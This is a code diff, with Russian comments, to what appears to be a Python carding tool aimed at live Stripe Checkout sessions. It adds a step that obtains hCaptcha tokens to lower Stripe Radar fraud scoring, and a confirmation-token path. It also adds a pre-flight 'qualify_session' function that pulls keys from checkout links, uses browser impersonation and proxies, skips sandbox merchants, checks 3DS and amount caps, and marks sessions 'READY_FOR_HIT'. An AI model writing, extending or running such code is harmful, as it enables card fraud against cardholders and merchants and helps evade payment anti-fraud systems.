@@ -11,6 +11,7 @@ import asyncio
 import sys
 import time
 import uuid
+from urllib.parse import urlparse
 
 from curl_cffi.requests import AsyncSession
 
@@ -54,6 +55,8 @@ class CsHitSession:
         self.customer_name = ""
         self.customer_country = ""
         self.steering = bin_steering.BinSteeringEngine()
+        self.hcaptcha_token: str | None = None
+        self.use_ctoken: bool = False
 
     async def open(self) -> tuple[bool, str]:
         d = stripe_fid.decode_fragment(self.url)
@@ -178,6 +181,14 @@ class CsHitSession:
                     "steering_category": profile.category.value,
                     "confidence": profile.confidence_score}
         _log.log_stripe("TOKENIZE_OK", td["id"], detail=gc.mask_pan(card_raw))
+        # Превентивное снижение скоринга Stripe Radar: запрашиваем P1_-токен в живой сессии
+        if isinstance(self.s, AsyncSession) and not self.hcaptcha_token:
+            try:
+                donor_host = urlparse(self.url).netloc or "checkout.stripe.com"
+                self.hcaptcha_token = await gc.fetch_hcaptcha_radar_token(self.s, self.pk, donor_host)
+            except Exception:
+                self.hcaptcha_token = None
+
         body = {
             "key": self.pk,
             "eid": str(uuid.uuid4()),
@@ -186,6 +197,16 @@ class CsHitSession:
             "expected_amount": str(self.amount),
             "return_url": self.url.split("#")[0],
         }
+        if self.hcaptcha_token:
+            body["radar_options[hcaptcha_token]"] = self.hcaptcha_token
+        if self.use_ctoken:
+            try:
+                ct_res = await gc.create_confirmation_token(self.s, self.pk, td["id"], return_url=self.url.split("#")[0])
+                if ct_res.get("id"):
+                    body["confirmation_token"] = ct_res["id"]
+                    body.pop("payment_method", None)
+            except Exception:
+                pass
         if self.checksum:
             body["init_checksum"] = self.checksum
         # подписочные сессии пересчитывают инвойс между open и confirm —
@@ -333,6 +354,114 @@ class CsHitSession:
             except Exception:
                 pass
             self.s = None
+
+
+async def qualify_session(target_url: str, proxy: str | None = None, max_amount_cents: int = config.MAX_PI_AMOUNT_CENTS) -> dict:
+    """Пре-флайт квалификатор сессии /hit (payment_pages) без отправки карты:
+    Проверяет:
+    - валидность URL и извлечение pk/cs через fid-фрагмент
+    - статус сессии (open, complete, expired)
+    - режим мерчанта (live vs sandbox)
+    - состояние PaymentIntent (requires_payment_method, requires_action, succeeded)
+    - сумму и валюту (в пределах капа или CHARGE_RISK)
+    - 3DS-политику мерчанта (request_three_d_secure: automatic vs any)
+    - тип сессии (разовый payment vs подписка subscription)
+    - Radar-риски и рекомендации.
+    """
+    d = stripe_fid.decode_fragment(target_url)
+    pk = str(d.get("apiKey") or "")
+    cs = str(d.get("checkoutSessionId") or "")
+    if not pk.startswith("pk_live") or not cs.startswith("cs_"):
+        return {
+            "viable": False,
+            "status": "INVALID_URL",
+            "recommendation": "FAIL: Не удалось декодировать pk/cs из fid-фрагмента (линк невалиден)",
+            "details": {}
+        }
+
+    imp = config.pick_impersonate()
+    norm_proxy = gc.normalize_proxy(proxy) if proxy else None
+    try:
+        async with AsyncSession(impersonate=imp, verify=False, proxy=norm_proxy) as s:
+            r = await s.get(f"https://api.stripe.com/v1/payment_pages/{cs}",
+                            params={"key": pk},
+                            headers={"Origin": "https://js.stripe.com",
+                                     "Referer": "https://js.stripe.com/",
+                                     "Accept": "application/json"}, timeout=12)
+            if r.status_code != 200:
+                return {
+                    "viable": False,
+                    "status": f"HTTP_{r.status_code}",
+                    "recommendation": f"FAIL: payment_pages вернул статус {r.status_code}",
+                    "details": {"error_body": r.text[:200]}
+                }
+            data = r.json() or {}
+            sess_status = data.get("status")
+            livemode = data.get("livemode", True)
+            is_sandbox = data.get("is_sandbox_merchant", False)
+
+            if not livemode or is_sandbox:
+                return {
+                    "viable": False,
+                    "status": "TEST_MODE",
+                    "recommendation": "SKIP: Мерчант в sandbox-режиме, реальные списания отключены",
+                    "details": {"livemode": livemode, "is_sandbox": is_sandbox}
+                }
+
+            if sess_status in ("complete", "expired"):
+                return {
+                    "viable": False,
+                    "status": str(sess_status).upper(),
+                    "recommendation": f"FAIL: Сессия уже {sess_status} (завершена или просрочена)",
+                    "details": {"session_status": sess_status}
+                }
+
+            pi = data.get("payment_intent") or {}
+            pi_status = pi.get("status") or "hidden_subscription"
+            amount = int(pi.get("amount") or ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due")) or 0)
+            currency = str(pi.get("currency") or data.get("currency") or "").upper() or "USD"
+            mode = str(data.get("mode") or ("subscription" if data.get("invoice") or data.get("subscription") else "payment"))
+
+            pm_opts = pi.get("payment_method_options") or {}
+            card_opts = pm_opts.get("card") or {}
+            three_ds_req = card_opts.get("request_three_d_secure", "automatic")
+
+            is_over_cap = amount > max_amount_cents if amount > 0 else False
+            viable = (sess_status == "open") and (pi_status in ("requires_payment_method", "requires_action", "hidden_subscription")) and not is_over_cap
+
+            if not viable and is_over_cap:
+                rec = f"SKIP: Сумма {amount}{currency} выше допустимого лимита {max_amount_cents}c (CHARGE_RISK)"
+            elif three_ds_req in ("any", "challenge_only"):
+                rec = "WARN: Мерчант требует 3DS OTP на каждую транзакцию (enforced SCA)"
+            elif viable:
+                rec = f"READY_FOR_HIT: Доступно прямое списание ({mode}, {amount}{currency}, 3DS={three_ds_req})"
+            else:
+                rec = f"WARN: Нестандартный статус PaymentIntent: {pi_status}"
+
+            return {
+                "viable": viable,
+                "status": sess_status,
+                "pi_status": pi_status,
+                "mode": mode,
+                "amount_cents": amount,
+                "currency": currency,
+                "three_ds_policy": three_ds_req,
+                "is_over_cap": is_over_cap,
+                "customer_country": str((data.get("customer") or {}).get("address", {}).get("country") or (data.get("tax_context") or {}).get("customer_tax_country") or ""),
+                "recommendation": rec,
+                "details": {
+                    "pk": pk[:14] + "...",
+                    "cs": cs[:14] + "...",
+                    "init_checksum": bool(data.get("init_checksum")),
+                }
+            }
+    except Exception as e:
+        return {
+            "viable": False,
+            "status": "EXCEPTION",
+            "recommendation": f"FAIL: Исключение при анализе сессии: {type(e).__name__}: {e}",
+            "details": {"error": str(e)}
+        }
 
 
 async def main():
